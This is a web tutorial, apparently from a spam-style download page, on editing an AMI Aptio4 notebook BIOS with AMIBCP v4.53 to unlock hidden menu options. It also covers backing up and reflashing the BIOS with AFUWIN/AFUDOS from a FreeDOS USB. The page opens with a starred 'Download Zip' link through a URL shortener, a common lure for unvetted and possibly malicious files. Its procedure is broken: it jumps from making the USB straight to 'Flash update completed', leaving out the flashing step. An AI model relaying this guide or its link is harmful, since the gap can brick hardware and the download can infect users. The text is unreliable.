# How to Use AMIBCP v4.53 93 to Unlock Hidden BIOS Features
 
AMIBCP v4.53 93 is a BIOS configuration program that allows you to modify your notebook BIOS to unlock hidden functions for an UEFI AMI Aptio4 BIOS. This tutorial will show you how to use AMIBCP v4.53 93 to edit your BIOS settings and flash your modified BIOS image.
 
**Download Zip ✯✯✯ [https://t.co/GELF2y6a8K](https://t.co/GELF2y6a8K)**


 
## What You Need
 
- The latest original BIOS from your notebook manufacturer
- Rufus 2.xx (to create a FreeDOS bootable USB) download from https://rufus.akeo.ie/downloads/rufus-2.2p.exe
- AFUDOS v3.06 (BIOS update utility from AMI for DOS with BIOS security bypass feature)
- AfuWin (BIOS update utility from AMI for Windows NT)
- AMIBCP v4.53 93 (BIOS Configuration Program)
- (optional) AMI ChangeLogo (to change BIOS boot logo)

## Steps by Step

1. Update BIOS to the latest official version. Follow steps provided by your notebook manufacturer.
2. Load optimal default settings in BIOS.
3. Boot to your Windows OS.
4. Open AFUWINGUI.EXE to make a backup of your current BIOS image.
    - Click on 'Progress' tab, then click on 'Save' button.
    - Choose where to save and put a name on it or leave it as afuwin.rom.
    - After completed, click 'Exit'.
    - Save a copy of the backup to a safe place, just in case.
5. Open AMIBCP.exe (where the fun begins).
    - Click File -> Open, then select the backup saved on step 4. (afuwin.rom or however you named it)
    - Just change Access/Use from 'Default' to 'USER' to every menu/sub-menu/option you want to unlock.
    - After you changed everything you want to unlock, click on the 'Save' button (overwrite the current, don't use save as).
    - Now close program, if asked you can select save changes again (doesn't matter).
6. (optional) Change OEM boot logo.
    - Open ChangeLogo.exe, click on 'Load Image'.
    - Select the modified BIOS already edited with AMIBCP.
    - Click 'Save Logo'.
    - Now edit it as you wish with mspaint, gimp etc.. but preserve the dimensions and format.
    - To change it, click 'Browse' -> Select the edited logo, then click on 'Replace Logo' (it will say something like: JPEG not supported, do you want to continue?).
7. Create a FreeDOS bootable USB using Rufus 2.xx.
    - Select your USB drive under Device.
    - Select FreeDOS under Boot selection.
    - Select MBR under Partition scheme.
    - Select FAT32 under File system.
    - Select Default under Cluster size.
    - Type a name under Volume label (optional).
    - Click Start and wait until it finishes.
8. If everything goes well, you should see a message saying "Flash update completed".
9. Reboot your notebook and enter the BIOS setup (usually by pressing F2 or Del during startup).
10. You should see the hidden BIOS features unlocked and accessible. Enjoy!

## Disclaimer

    This tutorial is for educational purposes only. Do this at your own risk, bad flash can brick your BIOS. We are not responsible for any damage or loss caused by following this tutorial.
8cf37b1e13


